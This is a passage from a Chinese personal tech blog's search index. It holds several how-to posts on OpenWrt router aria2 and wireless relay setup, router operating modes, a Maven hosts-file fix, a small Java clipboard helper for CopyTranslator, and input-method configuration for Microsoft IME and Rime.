参考"></a>4. 参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9vcGVuamRrLmphdmEubmV0L2plcHMvMzQz" title="https://openjdk.java.net/jeps/343">JEP 343: Packaging Tool (Incubator)<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXR6NDExcTdRMT9wPTQ=" title="https://www.bilibili.com/video/BV1tz411q7Q1?p=4">JavaFX环境搭建&amp;部署打包<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kem9uZS5jb20vYXJ0aWNsZXMvYS1icmllZi1leGFtcGxlLXVzaW5nLXRoZS1lYXJseS1hY2Nlc3MtanBhY2thZ2UtdXQ=" title="https://dzone.com/articles/a-brief-example-using-the-early-access-jpackage-ut">Brief Example Using the Early Access jpackage Utility<i class="fa fa-external-link"></i></span></li></ul><p>总算是写完了，从学习modular到遇到各种坑，花了差不多整整一天，就为了打包javafx。总体来说，jpackage还不算成熟，仍有些bug，比如为什么一定要添加vendor，又如为什么–win-menu一定要和–win-menu-group配套。但总体来说能使用。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jpackage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>潘多拉（openwrt）aria2使用记录</title>
      <link href="/archives/4014c94e.html"/>
      <url>/archives/4014c94e.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-配置"><a href="#1-配置" class="headerlink" title="1. 配置"></a>1. 配置</h2><p>首先通过ssh连接路由器，然后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br></pre></td></tr></table></figure><p>接着在软件包管理中搜索aria2:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221329438.png" alt="image-20200502221329438"></p><p>安装以上三个包。刷新页面，就可以在服务下发现关于aria2的UI：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221414909.png" alt="image-20200502221414909"></p><p>然后就是看自己的需求进行配置了。</p><p>一般来说，主要需要修改：</p><ul><li>文件下载目录</li><li>服务器连接数&amp;线程数</li><li>如果要用bt下载的话，需要更新tracker。tracker可以从这里拿：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25nb3NhbmcvdHJhY2tlcnNsaXN0" title="https://github.com/ngosang/trackerslist">https://github.com/ngosang/trackerslist<i class="fa fa-external-link"></i></span></li></ul><p>aria2开启后，点击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502221558331.png" alt="image-20200502221558331"></p><p>进入后台管理界面，然后就可以愉快的下载文件了。</p><p>在路由器上使用aria下载文件时，遇到了这样的问题：</p><h2 id="2-问题"><a href="#2-问题" class="headerlink" title="2. 问题"></a>2. 问题</h2><p>[SocketCore.cc:1015] errorCode=1 SSL/TLS handshake failure: unable to get local issuer certificate</p><p>其实就是因为没有证书，所以无法下载https文件。</p><p>下载安装<code>ca-certificates</code>即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502220639345.png" alt="image-20200502220639345"></p>]]></content>
      
      
      <categories>
          
          <category> 路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>潘多拉（Openwrt）固件无线中继&amp;无线桥接设置方法</title>
      <link href="/archives/2c9084de.html"/>
      <url>/archives/2c9084de.html</url>
      
        <content type="html"><![CDATA[<p>潘多拉是openwrt的一个分支，所以两者的设置方案基本相同。这里以潘多拉为例，进行说明。</p><p>虽然非必须，但是我还是强烈建议了解一下路由器的各个<a href="https://www.ravenxrz.ink/archives/b8925de5.html">工作模式的区别</a>。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>openwrt设置无线中继的方式和常用固件的方式不同，比如我们常用的tp-link，它设置无线中继只用选定无线桥接（无线中继，WDS）功能，扫描被中继的wifi，填入密码，写入新wifi的ssid即可。openwrt则不同，openwrt没有提供一键无线中继的功能，相反它将这个功能分为两个部分：</p><ol><li>作为client去接收主路由的信号</li><li>作为master发射信号给其它上网设备</li></ol><p>整个配置架构如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502105953768.png" alt="image-20200502105953768"></p><a id="more"></a><p>现在开始来配置吧：</p><h3 id="step1：修改接口ip"><a href="#step1：修改接口ip" class="headerlink" title="step1：修改接口ip"></a>step1：修改接口ip</h3><p>首先要做的是，将从路由器的网段和主路由器的网段分开。</p><p>假设主路由采用网段192.168.1.x，那么从路由器就不能使用这个网段，将它改为192.168.2.x。</p><p>如下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502110942144.png" alt="image-20200502110942144"></p><p>注意更改网段后，进入管理后台也需要更高地址，如原来是192.168.1.1，现在则变为了192.168.2.1。</p><h3 id="step2：配置Client，接收主路由信号"><a href="#step2：配置Client，接收主路由信号" class="headerlink" title="step2：配置Client，接收主路由信号"></a>step2：配置Client，接收主路由信号</h3><p>网络-&gt;无线，如果你的路由器支持双频的话，默认情况下是有两个接口，如：下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502111303939.png" alt="image-20200502111303939"></p><p>现在选择一个网卡，点扫描，我就选择5G频段的网卡：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502111352587.png" alt="image-20200502111352587"></p><p>选中要加入的网络，点“加入网络”</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502111512207.png" alt="image-20200502111512207"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502115024472.png" alt="image-20200502115024472"></p><p>现在来检查一下配置是否成功，点击接口：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502112017941.png" alt="image-20200502112017941"></p><p>可以看到”CONNECT_5G”（如果你前面都按照步骤来做，你应该看WWAN接口）这个接口被分配了192.168.123.187这个ip，而我的主路由的网段就是192.168.123.x。如果你没有的话，点一下旁边的“连接”按钮。</p><p>现在，Client端就算配置完成了，现在你可以通过有线连接从路由器进行上网了。所以配置到这里，从路由器相当于充当了无线网卡的功能。（想一下，买一个USB无线网卡查到台式机上）。</p><p>下面，我们需要把从路由的wifi发射出去。</p><h3 id="step3：配置Master，发送从路由信号"><a href="#step3：配置Master，发送从路由信号" class="headerlink" title="step3：配置Master，发送从路由信号"></a>step3：配置Master，发送从路由信号</h3><p>回到无线选项，点击添加</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502112402242.png" alt="image-20200502112402242"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502112856370.png" alt="image-20200502112856370"></p><p>三个注意点：</p><ol><li>SSID的设置，可和主路由相同，这样可实现无线漫游（即信号弱时自动切换），不同，则相当于一个新的wifi。</li><li>模式一定选择“接入点AP”。</li><li>网络接口选择lan。</li></ol><p>保存生效即可。</p><p>ok，到这一步，你的其它设备可以通过无线上网了。但是现在有一些问题需要说明：</p><h3 id="step4-2-4G转5G，5G转2-4G"><a href="#step4-2-4G转5G，5G转2-4G" class="headerlink" title="step4: 2.4G转5G，5G转2.4G"></a>step4: 2.4G转5G，5G转2.4G</h3><p>如果你一路配置过来，你的无线功能界面应该长这个样子：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502112740680.png" alt="image-20200502112740680"></p><p>也就是说，我们用了一张网卡，既充当了接收端，又充当了发送端。那么最大带宽就会减半。所以，如果你的路由器时双频的，我们可以用一张网卡来做接收端，另一张网卡做发送端。</p><p>比如，用2.4G做接收，5G做发送：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502113029714.png" alt="image-20200502113029714"></p><p>具体配置和step2中完全相同。这里不赘述。</p><h2 id="从路由器和主路由（同一网段or不同网段？）"><a href="#从路由器和主路由（同一网段or不同网段？）" class="headerlink" title="从路由器和主路由（同一网段or不同网段？）"></a>从路由器和主路由（同一网段or不同网段？）</h2><p>像上面那样的配置，从路由下的设备和主路由下的设备是在不同网段的。那这就会有个问题了，比如我要和基友们玩mc，我挂在主路由下，他们挂在从路由下，这怎么玩啊？</p><p>那怎么解决呢？根据我百度出来的资料来看，目前有两种解决方案：</p><ol><li>安装luci-proto-relay ，插件解决。这个方案，我没有尝试，因为略微复杂，贴一个链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cucmlnaHQuY29tLmNuL0ZPUlVNL3RocmVhZC0xOTAxMTUtMS0xLmh0bWw=" title="https://www.right.com.cn/FORUM/thread-190115-1-1.html">https://www.right.com.cn/FORUM/thread-190115-1-1.html<i class="fa fa-external-link"></i></span></li><li>添加桥接接口，形成“假的同一网段”。</li></ol><p>这里就详细说一下第二个方法：</p><p>打开接口界面，添加接口：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502113749281.png"></p><p>然后其余设置都采用默认。</p><p>最后会得到下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200502115224199.png" alt="image-20200502113901838"></p><p>同样，查看是否获得了ip，如果没有，点击一下旁边的“连接”。</p><p><strong>为什么说这是一个“假的同网段呢”。</strong></p><p>因为在主路由下的设备网段都是“192.168.123.x”，而在从路由器下的设备网段依然是“192.168.2.x”。</p><p>只不过通过relay接口的桥接，可以实现相互通信了。</p><p><strong>那这样的好处是什么呢？</strong></p><p>如果形成“真的同网段”，那么我们无法容易地进入从路由器设备的管理界面。但是如果是“假同网段”，我们依然可以通过192.168.2.1进入后台管理界面。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3NpbmUvcC81MjM4NDY1Lmh0bWw=" title="https://www.cnblogs.com/wsine/p/5238465.html">Openwrt无线中继设置并访问外网<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmlnaHQuY29tLmNuL2ZvcnVtL3RocmVhZC00MDA5NTY0LTEtMS5odG1s" title="https://www.right.com.cn/forum/thread-4009564-1-1.html">OpenWrt简单实现无线桥接与主路由“同网段”<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2c2hhb3JvbmcvYXJ0aWNsZS9kZXRhaWxzLzUzMjMwNTQ1" title="https://blog.csdn.net/lvshaorong/article/details/53230545">OpenWrt路由器无线中继、桥接、信号放大、访客网络的实现方案<i class="fa fa-external-link"></i></span></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线中继 </tag>
            
            <tag> 无线桥接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器工作模式科普</title>
      <link href="/archives/b8925de5.html"/>
      <url>/archives/b8925de5.html</url>
      
        <content type="html"><![CDATA[<p>转载自：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3NTI2NjcyL2FydGljbGUvZGV0YWlscy84MDQxMTY4Nw==" title="https://blog.csdn.net/m0_37526672/article/details/80411687">https://blog.csdn.net/m0_37526672/article/details/80411687<i class="fa fa-external-link"></i></span></p><h3 id="先给结论"><a href="#先给结论" class="headerlink" title="先给结论"></a>先给结论</h3><ol><li>AP模式（接入点模式）：操作极为简单，适合迫切需要WiFi、但是又懒得设置操作的用户；</li><li>Router模式（路由模式）：管理功能强大，控制能力强，带有NAT二级网络转发，操作比较复杂，需要使用者了解一定的网络基础知识；</li><li>Repeater模式（中继模式）：通用性较强，但是也是需要自行设置，可中继转发原有WiFi，适合区域比较大地方使用；</li><li>Bridge模式（桥接模式）：操作简单，适合共享隔壁老王的WiFi；</li><li>Client模式（客户端模式）：接收无线信号，通过有线传递出去，适合没有无线网卡只有有限网口的上网设备，应急使用。</li></ol><h3 id="AP模式（接入点模式）"><a href="#AP模式（接入点模式）" class="headerlink" title="AP模式（接入点模式）"></a>AP模式（接入点模式）</h3><p>AP模式主要是将有线信号转变成无线WiFi信号，这是我们最常使用的一种模式。AP模式不负责管理网络，相当于一台拥有无限功能的交换机，把有线信号转换为无限信号而已，其他功能需要依靠路由器去实现（分配IP、管理网络等）</p><p>特点：通过网线转换成无线网络，可以设置自己的SSID以及无限密码，无管理网络功能。</p><p>适用场景：酒店、宾馆等</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/205712e7ffsxsize1xecf1.png"></p><a id="more"></a><h3 id="Router模式（路由模式）"><a href="#Router模式（路由模式）" class="headerlink" title="Router模式（路由模式）"></a>Router模式（路由模式）</h3><p>Router模式通过WAN口接入Internet，功能与普通无线路由器功能相同，可以保存宽带的账号密码，并自动拨号连接（比如ADSL宽带、公司固定IP地址等网络），多个无线终端共享一条宽带（一个账号或IP地址）。简单的说，你家里的ADSL或者光猫安装好之后，可以通过路由模式，让无线路由器使用PPPoE（虚拟拨号）连接光猫上网。</p><p>特点：需要配置PPPoE拨号设置，宽带拨号上网。</p><p>适用场景：家庭、公司等环境。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/205713yb5g39fzoqc357zb.png"></p><h3 id="Repeater模式（中继模式）"><a href="#Repeater模式（中继模式）" class="headerlink" title="Repeater模式（中继模式）"></a>Repeater模式（中继模式）</h3><p>Repeater模式通俗的讲就是可以增强已有的无线网络信号，扩大其覆盖范围。可以将路由器安放至原有无线信号的边缘地带，将此无线信号增强。增强后的无线网络的SSID（无线网络名称）和密码与原无线网络相同。但是要注意，此信号只可以中继一次，即只能将原信号增强放大，新的无线信号无法再中继放大。比如一个设备在客厅，但是因为信号不佳，卧室信号可能只有一格，就可以使用中继模式来进一步“放大”无线网络了；“放大”后的无线信号的名称和原来的无线路由器信号名称一致，因此手机、平板、笔记本电脑不需要手动切换。</p><p>特点：需要连接另一个WiFi信号，WiFi名称设置完全一致，只可以中继一次。</p><p>适用场景：别墅、会所、广场等面积大的区域使用。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/205713pwfm39zxm9yim6mn.png"></p><h3 id="Bridge模式（桥接模式）"><a href="#Bridge模式（桥接模式）" class="headerlink" title="Bridge模式（桥接模式）"></a>Bridge模式（桥接模式）</h3><p> Bridge模式的功能与Repeater中继模式类似，同样是将已有的无线网络信号增强，扩大其覆盖范围。区别在于新的无线信号可以自定义成新的SSID（无线网络名称）和密码，新网络信号是独立存在的，并且可以继续使用Bridge桥接模式继续向远处无限桥接，无限增强。通过无线桥接的方式连接前端路由器的信号，自身发射新的无线信号。</p><p>特点：可使用路由器重新分配IP地址，建立二级网络。</p><p>适用场景：共享别人家的无线网络。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/205712wpy6bn0hp1ussz1p.png"></p><h3 id="Client模式（客户端的模式）"><a href="#Client模式（客户端的模式）" class="headerlink" title="Client模式（客户端的模式）"></a>Client模式（客户端的模式）</h3><p>Client模式将路由器当成无线网卡使用。通过网线与没有无线网卡的电脑连接，路由器就相当于一个无线网卡，搜索连接其他无线网络。将有线网络、台式电脑（没有无线网卡设备）通过无线的方式接入网络。</p><p>特点：接收无线信号，通过有线传递出去。</p><p>适用场景：没有无线网卡只有有限网口的上网设备，应急使用。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/205713jcya48npybnynba2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工作模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA添加Maven framework时出现Error reading /pom.xml错误解决方案</title>
      <link href="/archives/36f93f50.html"/>
      <url>/archives/36f93f50.html</url>
      
        <content type="html"><![CDATA[<p>今天给Idea添加Maven框架的时候，出现了<code>Error reading pom.xml</code>错误，解决方案：</p><p>打开系统hosts文件（C:\Windows\System32\drivers\etc路径下），添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br></pre></td></tr></table></figure><p>即可。</p>]]></content>
      
      
      <categories>
          
          <category> Maven </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CopyActionDaemon开发记录</title>
      <link href="/archives/de3a4f44.html"/>
      <url>/archives/de3a4f44.html</url>
      
        <content type="html"><![CDATA[<p>本文对应项目：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L0NvcHlBY3Rpb25EYWVtb24=" title="https://github.com/ravenxrz/CopyActionDaemon">https://github.com/ravenxrz/CopyActionDaemon<i class="fa fa-external-link"></i></span></p><h2 id="1-初心"><a href="#1-初心" class="headerlink" title="1. 初心"></a>1. 初心</h2><p>CopyTranslator真的是一个非常良心的文献阅读翻译软件，但或许是功能越来越多的原因，CopyTranslator也出现了一些bug。比如在”拖拽翻译“功能上，就可能出现明明已经划词，但是Copytranslator没有反应的情况。</p><a id="more"></a><p>如，在对照模式下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/8a1yTdsfsE.gif"></p><p>这里已经勾选了“拖拽复制”功能，但是却没有效果，同样的情况也发生在专注模式下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/f8LwkuSXh6.gif"></p><p>CopyActionDaemon则是为了解决这个feature bug而开发的。当然了，CopyTranslaor仍在更新迭代中，所以这个Project很可能要不了多久就作废了。</p><p>另外：</p><blockquote><p>由于个人不会js的相关技术，所以最终采用了自己比较熟悉的<strong>java</strong>来实现。但java是依赖<strong>jre</strong>的，所以对没有安装jre的小伙伴来说就不太友好了。</p></blockquote><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h2><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>拖拽翻译：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/mkabHo3oB1.gif"></p><p>双击翻译：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/OtKACSXKJy.gif"></p><h3 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h3><p>进入 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L0NvcHlBY3Rpb25EYWVtb24vcmVsZWFzZXM=" title="https://github.com/ravenxrz/CopyActionDaemon/releases">release<i class="fa fa-external-link"></i></span>页面下载CopyActionDaemon.jar。</p><blockquote><p>提示，一定要确保电脑有jre环境。</p></blockquote><p>然后，打开cmd窗口，执行:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd 到CopyActionDaemon.jar的路径下去</span><br><span class="line">java -jar CopyActionDaemon.jar</span><br></pre></td></tr></table></figure><p>如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200427202255644.png" alt="image-20200427202255644"></p><p>使用Ctrl+C结束进程。</p><p>如果现在后台运行jar包，可致性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javaw -jar start CopyActionDaemon.jar</span><br></pre></td></tr></table></figure><p>但是后者要想结束进程就没那么容易了，可以通过<strong>”资源监视器“</strong>来结束进程。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200427202939388.png" alt="image-20200427202939388"></p><p>总体来说，<strong>推荐第一种使用方法，因为方便开关，要结束Ctrl+C，要重新开始，按一下上再回车即可。</strong></p><h2 id="3-开发过程"><a href="#3-开发过程" class="headerlink" title="3. 开发过程"></a>3. 开发过程</h2><blockquote><p>因为CopyTranslator的这个feature bug，其实弄得我挺糟心的，因为我太懒了，看文献的时候就是不想手动按Ctrl C。所以中途还上网找了两个其它方案–知云和scitranslate，但是它们两个的官网做得实在是一言难尽，且它们固定了pdf软件，而它们pdf不满足我的要求（全屏+只定义背景色）。所以我尝试了小半天，还是回到了CopyTranslator的阵营。</p><p>于是为了解决CopyTranslator的这个”拖拽翻译“的bug，就有了这个小项目。</p></blockquote><p>解决的思路其实很简单，虽然我不懂JS，但是CopyTranslator应该是监听系统clipboard的变化，然后从clipboard中读数据进行翻译。也就是说，我需要做的就仅仅是把给clipboard喂数据就行了。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200427204951530.png" alt="image-20200427204951530"></p><p>最开始想着用Qt来做，但是没想到Windows没有提供这样的Api（获取选中的文本），于是只能曲线救国：<strong>监听鼠标的按下和释放过程，在释放的时候模拟Ctrl+C，这样就行把选中的文本复制到剪贴板中了。</strong>结果Qt的模拟按键我没有找到合适的方法，主要还是自己把Qt给忘得差不多了。所以最终选择了java来做。</p><p>因为java本身是不支持全局监听鼠标的，所以这里用到了开源库：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t3aGF0L2puYXRpdmVob29r" title="https://github.com/kwhat/jnativehook">jnativehook<i class="fa fa-external-link"></i></span></li></ul><p>另外，因为我没有mac的电脑，所以没法测试，mac用户如果需要使用，只需要修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// copymethods/CopyRobot.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">triggerCopy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// CONTROL换Command</span></span><br><span class="line">     robot.keyPress(KeyEvent.VK_CONTROL);</span><br><span class="line">     robot.keyPress(KeyEvent.VK_C);  </span><br><span class="line">     robot.delay(robot.getAutoDelay()); </span><br><span class="line">     robot.keyRelease(KeyEvent.VK_C);</span><br><span class="line">    <span class="comment">// CONTROL换Command</span></span><br><span class="line">     robot.keyRelease(KeyEvent.VK_CONTROL);</span><br><span class="line"> &#125;                                                 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CopyTranslator </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软输入法导入小鹤双拼方案</title>
      <link href="/archives/a7866676.html"/>
      <url>/archives/a7866676.html</url>
      
        <content type="html"><![CDATA[<p>上周折腾了会rime，因为感觉皮肤实在不太好看（其实可以自己折腾，但是我比较懒），另外就是没有云输入，所以还是有些不太好用，想着自己只是为了不要那么多的垃圾广告，所以来看看一直被我忽视的的微软输入法。没想到它是可以自定义输入方案的。</p><p>我使用的是<strong>小鹤双拼</strong>，这里说一下如何导入，新建txt文件：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\CHS]</span><br><span class="line">&quot;LangBar Force On&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;Enable Double Pinyin&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;EmoticonTipTriggerCount&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;HapLastDownloadTime&quot;&#x3D;hex(b):eb,69,29,59,00,00,00,00</span><br><span class="line">&quot;UserDefinedDoublePinyinScheme0&quot;&#x3D;&quot;FlyPY*2*^*iuvdjhcwfg xmlnpbksqszxkrltvyovt&quot;</span><br><span class="line">&quot;DoublePinyinScheme&quot;&#x3D;dword:0000000a</span><br><span class="line">&quot;UDLLastUpdatedTime&quot;&#x3D;&quot;2017-05-27 22:01:40&quot;</span><br><span class="line">&quot;UDLCount&quot;&#x3D;dword:0000018b</span><br><span class="line">&quot;UDLVisibleCount&quot;&#x3D;dword:0000018b</span><br></pre></td></tr></table></figure><p>重命名为.reg后缀的文件，在双击运行之前，<strong>记住要备份自己的注册表。</strong></p><p>需要备份注册表路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\CHS</span><br></pre></td></tr></table></figure><p>最后，运行刚才保存的reg文件即可。</p><p>现在系统默认的输入法就是小鹤双拼方案了：</p><p><img data-src="https://pic.downk.cc/item/5ea5461ac2a9a83be5d51850.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 输入法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rime输入法配置总结</title>
      <link href="/archives/4e7b500c.html"/>
      <url>/archives/4e7b500c.html</url>
      
        <content type="html"><![CDATA[<p>闲暇之余，折腾了一两天的输入法。简单记录一下。</p><p><strong>本文的主人公- rime输入法</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422193028219.png" alt="image-20200422193028219"></p><a id="more"></a><h2 id="1-rime是什么"><a href="#1-rime是什么" class="headerlink" title="1. rime是什么"></a>1. rime是什么</h2><p>简单来说，rime只是一个输入法引擎。配置各种输入法前端实现了跨平台（windows，macOS, linux, Android, IOS)。每种平台都有各自的名字，如：</p><p>Windows- 小狼毫。</p><p>macOS-鼠须管</p><p>Linux - ibus-rime或fcitx-rime</p><p>Android- 同文输入法</p><p>IOS- IRIME</p><p>不过跨平台并不是rime最强的优势，rime的最大优点在于它的高度可配置性。不过这也算是它的缺点，因为使用rime只做到开箱使用，那无疑是简陋的。所以要想玩rime，一定要有一颗爱折腾的心。不然，搜狗、百度、qq等输入足以满足需求。</p><h2 id="2-rime的基本使用"><a href="#2-rime的基本使用" class="headerlink" title="2. rime的基本使用"></a>2. rime的基本使用</h2><p>以小狼毫(Windows)为例：</p><p>开箱rime的输入法默认是繁体的，可通过按F4，选择其它方案。 如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422193602402.png" alt="image-20200422193602402"></p><p>而这些方案也是可选可定制的。所以催生了许多方言方案，如粤拼。</p><p>在任务栏中右键小狼毫，可调出它的菜单：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422193806280.png" alt="image-20200422193806280"></p><ul><li>输入法设定： 设置输入方案和输入法主题皮肤</li><li>用户词典管理: 这是windows用户所特有的管理界面，其余平台需要靠配置文件。这个界面主要是用来导入导出自己的词库的。（词库相当于自己的一套输入习惯，算是用户自己的输入数据库吧）</li><li>用户资料同步：将用户自己的一些配置同步到某个文件夹下（文件夹可配置），默认在rime用户文件夹的sync目录下。当用户在多个平台上使用rime时，这些同步文件有助于快速迁移用户配置。可选择“坚果云”来云备份。</li><li>用户文件夹： 用户的所有自定义配置都可以在这里进行配置。</li><li>程序文件夹：rime自身程序以来的一些文件程序等，一般不需要动。</li><li>重新部署：每次对rime进行了配置都需要重新部署使配置生效。</li></ul><h2 id="3-rime的配置文件"><a href="#3-rime的配置文件" class="headerlink" title="3. rime的配置文件"></a>3. rime的配置文件</h2><p>如何配置，当然是官方最为详细了。所以先贴观望的自定义配置url: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JpbWUvaG9tZS93aWtpL0N1c3RvbWl6YXRpb25HdWlkZQ==" title="https://github.com/rime/home/wiki/CustomizationGuide">https://github.com/rime/home/wiki/CustomizationGuide<i class="fa fa-external-link"></i></span></p><h3 id="3-1-添加输入方案"><a href="#3-1-添加输入方案" class="headerlink" title="3.1 添加输入方案"></a>3.1 添加输入方案</h3><p>rime默认是没有英文输入法的，打开用户文件目录，导入如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422194418632.png" alt="image-20200422194418632"></p><p>一般来说，一套输入方案包含两个文件，一个schema文件，用来配置所有输入方法的信息，在移动端显得非常重要（包括布局导入（26键位，30键位？），键位绑定信息等，是一些宏观的设定），而PC端则相对简单。dict文件则是该输入方案的词典。</p><p>另外也可以选择在线添加方案：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422194838662.png" alt="image-20200422194838662"></p><p>在github上找到相应输入方案的参数，输入该参数的 username/repositoryname 即可。</p><h3 id="3-2-配置文件的规定"><a href="#3-2-配置文件的规定" class="headerlink" title="3.2 配置文件的规定"></a>3.2 配置文件的规定</h3><p>让我们再看一下用户目录配置文件夹下的文件：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422195009516.png" 